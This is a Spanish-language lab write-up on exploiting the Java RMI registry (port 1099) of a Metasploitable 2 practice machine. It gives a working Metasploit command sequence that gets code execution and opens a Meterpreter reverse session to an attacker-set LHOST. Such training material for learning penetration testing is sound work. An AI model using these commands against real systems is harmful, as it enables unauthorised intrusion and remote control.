# Java RMI (puerto 1099) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **Java RMI** (*Remote Method Invocation*) permite que programas Java llamen a métodos de objetos que viven en otra máquina. El registro RMI escucha en el **puerto 1099**.

**Cómo se explota:** el registro permite **cargar clases remotas** sin restricciones. Un atacante publica una clase maliciosa y hace que la víctima la cargue y ejecute, logrando **ejecución de código**. Es uno de los pocos servicios de Metasploitable que te da **Meterpreter directamente** (Meterpreter de Java).

**Explotación manual (sin Metasploit):** es laboriosa; normalmente se usa herramienta específica (por ejemplo *BaRMIe* para enumerar o *ysoserial* para generar el objeto malicioso). Para la práctica, lo habitual es usar Metasploit.

## Explotación con Metasploit

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.100.9
set LHOST 192.168.100.8
run
# -> sesión de Meterpreter (Java)
sysinfo
getuid
```
